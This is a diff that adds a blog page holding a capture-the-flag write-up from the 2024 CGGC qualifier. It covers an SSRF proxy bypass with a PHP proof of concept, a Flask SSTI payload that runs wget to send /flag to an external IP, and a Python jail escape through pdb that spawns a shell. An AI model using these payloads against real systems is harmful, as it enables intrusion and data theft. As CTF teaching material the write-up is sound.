@@ -1,0 +1,454 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge"/>
+<meta name="viewport" content="width=device-width, initial-scale=1"/>
+
+<!--Description-->
+
+
+
+    <meta name="description" content="2024 CGGC Qual-writeup
+Author: 堇姬Naup
+
+簡單紀錄這場有摸的題目
+webproxy這題基本上就是要你GET request $service 和 $port並且會從你的url path抓東西，然後去做 curl目標是要抓到 http://secretweb/fla"/>
+
+
+<!--Author-->
+
+    <meta name="author" content="Naup堇姬"/>
+
+
+<!--Open Graph Title-->
+
+    <meta property="og:title" content="2024-CGGC-writeup"/>
+
+
+<!--Open Graph Description-->
+
+    <meta property="og:description" content="2024 CGGC Qual-writeup
+Author: 堇姬Naup
+
+簡單紀錄這場有摸的題目
+webproxy這題基本上就是要你GET request $service 和 $port並且會從你的url path抓東西，然後去做 curl目標是要抓到 http://secretweb/fla"/>
+
+
+<!--Open Graph Site Name-->
+    <meta property="og:site_name" content="堇姬 Naup&#39;s Blog"/>
+
+<!--Type page-->
+
+    <meta property="og:type" content="article"/>
+
+
+<!--Page Cover-->
+
+
+    <meta property="og:image" content="http://example.com/img/bg4.jpg"/>
+
+
+<meta name="twitter:card" content="summary_large_image"/>
+
+
+
+
+    <meta name="twitter:image" content="http://example.com/img/bg4.jpg"/>
+
+
+<!-- Title -->
+
+<title>2024-CGGC-writeup | 堇姬 Naup&#39;s Blog</title>
+
+<!-- Bootstrap Core CSS -->
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/bootstrap@4.4.1/dist/css/bootstrap.min.css">
+
+<!-- Custom CSS -->
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<!-- Custom Fonts -->
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/5.11.0/css/all.min.css" />
+<link href="//fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" rel="stylesheet" type="text/css"/>
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/5.11.0/css/all.min.css" />
+<link href="//fonts.googleapis.com/css2?family=Noto+Sans+TC:wght@100;300;400;500;700;900&display=swap" rel="stylesheet">
+<link href="//fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" rel="stylesheet" type="text/css"/>
+
+<!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+<!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+<!--[if lt IE 9]>
+<script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+<script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+<![endif]-->
+
+<!-- Gallery -->
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/featherlight@1.4.0/src/featherlight.css" integrity="sha256-30DV/STftlyQ6v8yaOWlabammvCYtRJERLj/m0b3zno=" crossorigin="anonymous">
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/lightgallery@1.6.11/dist/css/lightgallery.min.css">
+
+<!-- favicon -->
+
+<link rel="icon" href="/img/icon.jpg"/>
+
+
+
+    <!-- Google Analytics -->
+    
+
+
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.1.1"></head>
+<!-- Head tag -->
+
+<body>
+
+    <!-- Menu -->
+    <!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top bg-transparent position-absolute w-100 p-0" id="nav">
+    <div class="container pl-0 pr-0">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header page-scroll">
+            <a class="navbar-brand text-white p-1 pl-3" href="/">堇姬 Naup's Blog</a>
+        </div>
+        <div class="navbar-nav float-right">
+            <button class="btn btn-link search-btn navbar-item" data-toggle="modal" data-target="#searchModal">
+                <i class="fas fa-search"></i>
+            </button>
+        </div>
+    </div>
+    <!-- /.container -->
+</nav>
+
+    <!-- Main Content -->
+    <!-- Page Header -->
+<!-- Set your background image for this header in your post front-matter: cover -->
+
+<header class="intro-header" style="background-image: url('/img/bg4.jpg')">
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-12 col-md-12 text-center">
+                <div class="post-heading text-white">
+                    <h1>2024-CGGC-writeup</h1>
+                    
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+            <!-- Post Main Content -->
+            <div class="col-lg-8 offset-lg-2 col-md-10 offset-md-1">
+                
+                    <span class="meta d-inline-block">
+    
+    
+    <!-- Date -->
+    
+        <span class="post-meta-split">&nbsp;|&nbsp;</span>
+        <i class="far fa-calendar-check fa-fw"></i>
+        2024-11-05
+    
+    <!-- word count and read count -->
+    
+
+    
+
+    
+</span>  
+                
+                <h1 id="2024-CGGC-Qual-writeup"><a href="#2024-CGGC-Qual-writeup" class="headerlink" title="2024 CGGC Qual-writeup"></a>2024 CGGC Qual-writeup</h1><blockquote>
+<p>Author: 堇姬Naup</p>
+</blockquote>
+<p>簡單紀錄這場有摸的題目</p>
+<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="proxy"><a href="#proxy" class="headerlink" title="proxy"></a>proxy</h2><p>這題基本上就是要你GET request <code>$service</code> 和 <code>$port</code>並且會從你的url path抓東西，然後去做 curl<br>目標是要抓到 <a target="_blank" rel="noopener" href="http://secretweb/flag">http://secretweb/flag</a></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">proxy</span>(<span class="params"><span class="variable">$service</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$requestUri</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>];</span><br><span class="line">    <span class="variable">$parsedUrl</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$requestUri</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$port</span> = <span class="number">80</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;port&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$port</span> = (<span class="keyword">int</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;port&#x27;</span>];</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$_COOKIE</span>[<span class="string">&quot;port&quot;</span>]) &#123;</span><br><span class="line">        <span class="variable">$port</span> = (<span class="keyword">int</span>)<span class="variable">$_COOKIE</span>[<span class="string">&#x27;port&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;service&quot;</span>, <span class="variable">$service</span>);</span><br><span class="line">    <span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;port&quot;</span>, <span class="variable">$port</span>);</span><br><span class="line">    <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_FOLLOWLOCATION, <span class="literal">true</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;!$%^&amp;*()=+[]&#123;&#125;|;\&#x27;&quot;,&lt;&gt;?_-/#:.\\@&#x27;</span>;</span><br><span class="line">    <span class="variable">$fixeddomain</span> = <span class="title function_ invoke__">trim</span>(<span class="title function_ invoke__">trim</span>(<span class="variable">$service</span>, <span class="variable">$filter</span>).<span class="string">&quot;.cggc.chummy.tw:&quot;</span>.<span class="variable">$port</span>, <span class="variable">$filter</span>);</span><br><span class="line">    <span class="variable">$fixeddomain</span> = <span class="title function_ invoke__">idn_to_ascii</span>(<span class="variable">$fixeddomain</span>);</span><br><span class="line">    <span class="variable">$fixeddomain</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^0-9a-zA-Z-.:_]/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$fixeddomain</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="string">&#x27;http://&#x27;</span>.<span class="variable">$fixeddomain</span>.<span class="variable">$parsedUrl</span>[<span class="string">&#x27;path&#x27;</span>].<span class="string">&#x27;?&#x27;</span>.<span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>]);</span><br><span class="line">    <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;service&#x27;</span>]) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&quot;service&quot;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;service&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">proxy</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;service&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">proxy</span>(<span class="variable">$_COOKIE</span>[<span class="string">&quot;service&quot;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>這邊主要問題是傳入的service會經歷一系列filter(為 <code>$fixeddomain</code>)<br>兩次trim filter特殊字元，並接到<code>.cggc.chummy.tw:&lt;port&gt;</code> -&gt; idn_to_ascii(將Unicode DNS格式轉IDNA ASCII) -&gt; preg_match在做一次filter -&gt; <code>http://&lt;$fixeddomain&gt;&lt;parseurl path&gt;?&lt;query string&gt;</code></p>
+<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.idn-to-ascii.php">https://www.php.net/manual/zh/function.idn-to-ascii.php</a></p>
+<p>這邊有個問題<br>當service傳入一個很大的數字，<code>idn_to_ascii</code>吃到會回傳空的，所以把前面的&amp;service塞爆，後面串要請求的網址就行，下方是PoC</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_FOLLOWLOCATION, <span class="literal">true</span>);</span><br><span class="line"><span class="variable">$service</span> = <span class="title function_ invoke__">str_repeat</span>(<span class="string">&#x27;c&#x27;</span>, <span class="number">1000</span>);</span><br><span class="line"><span class="variable">$port</span> = <span class="number">80</span>;</span><br><span class="line"><span class="variable">$filter</span> = <span class="string">&#x27;!$%^&amp;*()=+[]&#123;&#125;|;\&#x27;&quot;,&lt;&gt;?_-/#:.\\@&#x27;</span>;</span><br><span class="line"><span class="variable">$fixeddomain</span> = <span class="title function_ invoke__">trim</span>(<span class="title function_ invoke__">trim</span>(<span class="variable">$service</span>, <span class="variable">$filter</span>).<span class="string">&quot;.cggc.chummy.tw:&quot;</span>.<span class="variable">$port</span>, <span class="variable">$filter</span>);</span><br><span class="line"><span class="variable">$fixeddomain</span> = <span class="title function_ invoke__">idn_to_ascii</span>(<span class="variable">$fixeddomain</span>);</span><br><span class="line"><span class="variable">$fixeddomain</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^0-9a-zA-Z-.:_]/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$fixeddomain</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$ch_url</span> = <span class="string">&#x27;http://&#x27;</span>.<span class="variable">$fixeddomain</span>.<span class="string">&#x27;webhook.site/e7af8d30-c95f-4ba7-aa4b-e47a00c1e48a&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$ch_url</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>final payload: <code>http://10.99.66.6/secretweb/flag?service=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</code></p>
+<blockquote>
+<p>Flag: CGGC{1Dn_7O_45c11_5o_57R4n9E_11fc26f06c33e83f65ade64679dc0e58}</p>
+</blockquote>
+<h2 id="Breakjail-Online-🛜"><a href="#Breakjail-Online-🛜" class="headerlink" title="Breakjail Online 🛜"></a>Breakjail Online 🛜</h2><p>這題是SSTI題</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/SsTiMe&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">showip</span>():</span><br><span class="line">    <span class="comment"># WOW! There has a SSTI in Flask!!!</span></span><br><span class="line">    q = request.args.get(<span class="string">&#x27;q&#x27;</span>, <span class="string">&quot;&#x27;7&#x27;*7&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># prevent smuggling bad payloads!</span></span><br><span class="line">    request.args = &#123;&#125;</span><br><span class="line">    request.headers = &#123;&#125;</span><br><span class="line">    request.cookies = &#123;&#125;</span><br><span class="line">    request.data = &#123;&#125;</span><br><span class="line">    request.query_string = <span class="string">b&quot;#&quot;</span>+request.query_string</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">any</span>([x <span class="keyword">in</span> <span class="string">&quot;._.|||&quot;</span> <span class="keyword">for</span> x <span class="keyword">in</span> q]) <span class="keyword">or</span> <span class="built_in">len</span>(q) &gt; <span class="number">88</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Too long for me :/ my payload less than 73 chars&quot;</span></span><br><span class="line"></span><br><span class="line">    res = render_template_string(<span class="string">f&quot;&#123;&#123;&#123;&#123;<span class="subst">&#123;q&#125;</span>&#125;&#125;&#125;&#125;&quot;</span>,</span><br><span class="line">                                 <span class="comment"># <span class="doctag">TODO:</span> just for debugging, remove this in production</span></span><br><span class="line">                                 <span class="built_in">breakpoint</span>=<span class="built_in">breakpoint</span>,</span><br><span class="line">                                 <span class="built_in">str</span>=<span class="built_in">str</span></span><br><span class="line">                                 )</span><br><span class="line"></span><br><span class="line">    <span class="comment"># oops, I just type &#x27;res&#x27; not res qq</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;res=7777777&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>過濾掉了<code>.</code>、<code>_</code>、<code>|</code>，並限制了長度不能夠大於88</p>
+<p>這題payload是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lipsum[&quot;\x5f\x5fglobals\x5f\x5f&quot;][&quot;os&quot;][&quot;system&quot;](&quot;wget 395507846:1/`cat /flag*`&quot;)</span><br></pre></td></tr></table></figure>
+<p>基本上就是用lipsum那條SSTI，用<code>[]</code>來bypass<code>.</code>被ban，<code>\x5</code>來bypass <code>_</code>，之後抓到system，用十進制的 ip 和<code>*</code>來壓短payload</p>
+<blockquote>
+<p>flag: CGGC{breakpoint_is_a_biiiig_gadget_oj237rpwd3i2}</p>
+</blockquote>
+<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="Breakjail-⛓️"><a href="#Breakjail-⛓️" class="headerlink" title="Breakjail ⛓️"></a>Breakjail ⛓️</h2><p>首先是他讓你輸入一個字串，先過濾了<code>.</code>、<code>_</code>並且限制長度不可以大於55，之後放入到<code>eval</code></p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/local/bin/python3</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">open</span>(__file__).read())</span><br><span class="line"></span><br><span class="line">flag = <span class="built_in">open</span>(<span class="string">&#x27;flag&#x27;</span>).read()</span><br><span class="line">flag = <span class="string">&quot;Got eaten by the cookie monster QQ&quot;</span></span><br><span class="line"></span><br><span class="line">inp = <span class="built_in">__import__</span>(<span class="string">&quot;unicodedata&quot;</span>).normalize(<span class="string">&quot;NFKC&quot;</span>, <span class="built_in">input</span>(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">any</span>([x <span class="keyword">in</span> <span class="string">&quot;._.&quot;</span> <span class="keyword">for</span> x <span class="keyword">in</span> inp]) <span class="keyword">or</span> inp.__len__() &gt; <span class="number">55</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;bad hacker&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">eval</span>(inp, &#123;<span class="string">&quot;__builtins__&quot;</span>: &#123;&#125;&#125;, &#123;</span><br><span class="line">         <span class="string">&#x27;breakpoint&#x27;</span>: <span class="built_in">__import__</span>(<span class="string">&#x27;GoodPdb&#x27;</span>).good_breakpoint&#125;)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
+
+<p>這裡的<code>eval</code>有兩個設定，一個把<code>__builtins__</code>清空，內建函數不可用，之後import <code>GoodPdb</code>的good_breakpoint給’breakpoint’<br>來看GoodPdb</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pdb</span><br><span class="line"></span><br><span class="line"><span class="comment"># patch from https://github.com/python/cpython/blob/ed24702bd0f9925908ce48584c31dfad732208b2/Lib/cmd.py#L98</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">GoodPdb</span>(pdb.Pdb):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">cmdloop</span>(<span class="params">self, intro=<span class="literal">None</span></span>):</span><br><span class="line">        ...</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">do_interact</span>(<span class="params">self, arg</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        no interactive!</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">good_breakpoint = GoodPdb().set_trace</span><br></pre></td></tr></table></figure>
+
+<p>GoodPdb繼承自整個<code>pdb.Pdb</code>，而他call了<code>set_trace</code><br>來看python3.14 documets<br><a target="_blank" rel="noopener" href="https://docs.python.org/zh-tw/3.14/library/pdb.html#pdb.set_trace">https://docs.python.org/zh-tw/3.14/library/pdb.html#pdb.set_trace</a><br>set_trace原型是<br><code>pdb.set_trace(*, header=None, commands=None)</code><br>commands是在3.14中加入的，他可以輸入一些pdb相關commands<br>當我們輸入 <code>breakpoint(commands=&#39;h&#39;)</code><br>可以看到有許多pdb commands可以用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">EOF    </span><br><span class="line">cl         </span><br><span class="line">disable     </span><br><span class="line">ignore    </span><br><span class="line">n        </span><br><span class="line">return  </span><br><span class="line">u          </span><br><span class="line">where</span><br><span class="line">a      </span><br><span class="line">clear      </span><br><span class="line">display     </span><br><span class="line">interact  </span><br><span class="line">next     </span><br><span class="line">retval  </span><br><span class="line">unalias  </span><br><span class="line">alias  </span><br><span class="line">commands   </span><br><span class="line">down        </span><br><span class="line">j         </span><br><span class="line">p        </span><br><span class="line">run     </span><br><span class="line">undisplay</span><br><span class="line">args   </span><br><span class="line">condition  </span><br><span class="line">enable      </span><br><span class="line">jump      </span><br><span class="line">pp       </span><br><span class="line">rv      </span><br><span class="line">unt      </span><br><span class="line">b      </span><br><span class="line">cont       </span><br><span class="line">exceptions  </span><br><span class="line">l         </span><br><span class="line">q        </span><br><span class="line">s       </span><br><span class="line">until    </span><br><span class="line">break  </span><br><span class="line">continue   </span><br><span class="line">exit        </span><br><span class="line">list      </span><br><span class="line">quit     </span><br><span class="line">source  </span><br><span class="line">up       </span><br><span class="line">bt     </span><br><span class="line">d          </span><br><span class="line">h           </span><br><span class="line">ll        </span><br><span class="line">r        </span><br><span class="line">step    </span><br><span class="line">w        </span><br><span class="line">c      </span><br><span class="line">debug      </span><br><span class="line">help        </span><br><span class="line">longlist  </span><br><span class="line">restart  </span><br><span class="line">tbreak  </span><br><span class="line">whatis </span><br></pre></td></tr></table></figure>
+<p>這邊下 <code>breakpoint(commands=[&quot;debug&quot;,])</code>，他會開一個pdb shell給你，我們就有任意python執行了<br>不過我們沒有內建函數，最後用<br><code>[&#39;&#39;.__class__.__base__.__subclasses__()[158].__init__.__globals__][0][&quot;system&quot;](&quot;sh&quot;)</code><br>開一個 shell，成功get flag</p>
+<blockquote>
+<p>flag: CGGC{breakpoint_new_feature_in_python_3.14a_can_GOOOOOTOOOOO_n23hq78weh12rb}</p>
+</blockquote>
+<h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="one-shot"><a href="#one-shot" class="headerlink" title="one_shot"></a>one_shot</h2><p>IDA逆一下會發現他叫你輸入一個 address，之後你可以往那個位置想0xE0大小的東西，並且有給你libc，然後保護全開</p>
+<p>簡單還說我們現在有一個 libc 任意寫，原本我的想法控puts底下在call strlen時，會去call <code>*ABS*@got.plt</code>，這裡的GOT是可寫段，所以把這裡改掉就可以控<code>rip</code>，但我沒想到怎麼去跳ROP，或是控rdi的方法<br>這邊賽後有看到其他組有用這方法做出來，可以來看這個repo<br><a target="_blank" rel="noopener" href="https://github.com/n132/Libc-GOT-Hijacking/blob/main/Post/README.md">https://github.com/n132/Libc-GOT-Hijacking/blob/main/Post/README.md</a></p>
+<p>最後是house of apple 解決<br><a target="_blank" rel="noopener" href="https://zikh26.github.io/posts/19609dd.html">https://zikh26.github.io/posts/19609dd.html</a></p>
+<blockquote>
+<p>CGGC{0ne_sh0t_14_4ll_y0u_nEEd!}</p>
+</blockquote>
+<h1 id="後記"><a href="#後記" class="headerlink" title="後記"></a>後記</h1><p>放一下score board<br>也感謝這兩天一起奮鬥的隊友 @Aukro @Flydragon @Whale.120<br><div class="img-item" data-src="https://hackmd.io/_uploads/SyljNcSbJl.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/SyljNcSbJl.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
+<p><div class="img-item" data-src="https://hackmd.io/_uploads/rJLjNcB-ke.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/rJLjNcB-ke.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
+
+            </div>
+
+            <!-- Post information -->
+            
+            
+    <div class="col-lg-8 offset-lg-2 col-md-10 offset-md-1">
+        <ul class="pagination d-block text-center">
+            
+            
+                <li class="next page-item d-inline"><a href="/2024/10/27/Kernel-pwn-CISCON-2017-babydriver/" class="page-link float-right">Older  &rarr;</a></li>
+            
+        </ul>
+    </div>
+
+
+            
+                <!-- Comments -->
+                
+
+                
+
+            
+
+        </div>
+    </div>
+</article> 
+
+
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
+    <style>
+        #toc-content .toc-link::before {
+            background-color: transparent;
+            max-height: 25px;
+        }
+
+        #toc-content .toc-link.is-active-link::before {
+            background-color: #404040;
+        }
+    </style>
+    <script src="//cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+    <div class="ui-toc dropup scrollspy-body pull-right" style="right: 3%;">
+        <button type="button" class="toc-btn btn btn-light" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" data-display="static">
+            <i class="fas fa-list"></i>
+        </button>
+        <div class="dropdown-menu dropdown-menu-right p-2"  aria-labelledby="tocLabel">
+            <div class="toc-widget">
+                <div id="toc-content" class="text-truncate">
+                </div>
+            </div>
+            <div class="toc-menu pt-3 pl-4">
+                <a class="expand-toggle d-block py-1" href="#"><span class="expand-text">Expand all</span><span class="close-text" style="display: none;">Collapse all</span></a>
+                <a class="back-to-top d-block py-1" href="#">Back to top</a>
+                <a class="go-to-bottom d-block py-1" href="#">Go to bottom</a>
+            </div>
+        </div>
+    </div>
+    <script>
+        tocbot.init({
+            // Where to render the table of contents.
+            tocSelector: '#toc-content',
+            // Where to grab the headings to build the table of contents.
+            contentSelector: 'article',
+            // Which headings to grab inside of the contentSelector element.
+            headingSelector: 'h1, h2, h3',
+            // For headings inside relative or absolute positioned containers within content.
+            hasInnerContainers: true,
+        });
+    </script>
+
+
+    
+
+
+    <!-- Footer -->
+    <hr />
+
+<!-- Footer -->
+<footer id="footer">
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 offset-lg-2 col-md-10 offset-md-1 text-center">
+                <ul class="list-inline">
+                    
+
+                    
+
+                    
+                        <li class="list-inline-item">
+                            <a rel="external" href="https://github.com/Naupjjin" target="_blank">
+                                <span class="fa-stack fa-lg">
+                                    <i class="fa fa-circle fa-stack-2x"></i>
+                                    <i class="fab fa-github fa-stack-1x fa-inverse"></i>
+                                </span>
+                            </a>
+                        </li>
+                    
+
+                    
+
+                    
